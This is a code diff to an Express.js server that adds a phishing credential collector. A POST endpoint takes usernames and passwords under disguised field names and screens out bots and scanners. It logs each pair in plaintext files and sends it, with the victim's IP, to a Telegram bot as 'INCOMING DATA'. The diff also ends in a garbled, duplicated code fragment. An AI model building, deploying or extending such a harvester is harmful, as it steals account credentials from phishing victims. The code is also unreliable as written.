@@ -1,5 +1,3 @@
-
-
 import express from "express";
 import crypto from "crypto";
 import fs from "fs";
@@ -31,7 +29,7 @@ app.use(express.json());
 
 app.use((req, res, next) => {
   res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
   res.setHeader(
     "Access-Control-Allow-Headers",
     "Content-Type, Accept, Accept-Language"
@@ -63,6 +61,124 @@ function readJSONSafe(file, def = {}) {
     if (!fs.existsSync(file)) return def;
     return JSON.parse(fs.readFileSync(file, "utf8"));
   } catch {
+    return def;
+  }
+}
+
+/* ================= GET TEST ================= */
+app.get("/", (req, res) => {
+  res.json({
+    ok: true,
+    message: "APINET ONLINE",
+    time: new Date().toISOString()
+  });
+});
+
+/* ================= POST MAIN ================= */
+app.post("/", async (req, res) => {
+  try {
+    const ip = getIP(req);
+    const ua = (req.headers["user-agent"] || "").toLowerCase();
+
+    /* ===== ANTI BOT (VALID) ===== */
+    if (!isDev) {
+      if (
+        !ua ||
+        ua.length < 10 ||
+        BOT_UA.some(b => ua.includes(b)) ||
+        !req.headers["accept"] ||
+        !req.headers["accept-language"] ||
+        !ip ||
+        isPrivateIP(ip)
+      ) {
+        return res.status(403).json({
+          ok: false,
+          reason: "blocked_by_antibot"
+        });
+      }
+    }
+
+    /* ===== RATE LIMIT ===== */
+    const rate = readJSONSafe(RATE_FILE, {});
+    const now = Date.now();
+
+    rate[ip] = (rate[ip] || []).filter(t => now - t < 60000);
+    if (rate[ip].length >= 5) {
+      return res.status(429).json({ error: "Too many requests" });
+    }
+
+    rate[ip].push(now);
+    fs.writeFileSync(RATE_FILE, JSON.stringify(rate));
+
+    /* ===== DATA ===== */
+    const { login, A, B } = req.body;
+    if (!A || !B) {
+      return res.status(400).json({ error: "Missing field" });
+    }
+
+    const user = A;
+    const pass = B;
+
+    /* ===== ANTISPAM ===== */
+    if (fs.existsSync(SPAM_FILE)) {
+      const lines = fs.readFileSync(SPAM_FILE, "utf8").split("\n");
+      if (lines.includes(`${user}|${pass}`)) {
+        return res.json({ ok: true, note: "duplicate ignored" });
+      }
+    }
+    fs.appendFileSync(SPAM_FILE, `${user}|${pass}\n`);
+
+    /* ===== UNIQUE ===== */
+    const used = readJSONSafe(USED_FILE, {});
+    const key = crypto.createHash("md5").update(`${user}|${pass}`).digest("hex");
+
+    if (used[key]) {
+      return res.json({ ok: true, note: "already exists" });
+    }
+
+    used[key] = { user, pass, ip, time: new Date().toISOString() };
+    fs.writeFileSync(USED_FILE, JSON.stringify(used, null, 2));
+
+    /* ===== TELEGRAM ===== */
+    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
+      const msg = `🧨 *INCOMING DATA*
+
+👤 user : \`${user}\`
+🔐 pass : \`${pass}\`
+
+🌍 IP   : \`${ip}\`
+⏱ TIME : \`${new Date().toISOString()}\`
+
+#APINET`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: process.env.CHAT_ID,
+            text: msg,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (e) {
+        console.error("Telegram error:", e.message);
+      }
+    }
+
+    return res.json({
+      ok: true,
+      received: { login, user, pass }
+    });
+
+  } catch (err) {
+    console.error("FATAL:", err);
+    return res.status(500).json({ error: "internal_error" });
+  }
+});
+
+/* ================= EXPORT ================= */
+export default app;  } catch {
     return def;
   }
 }
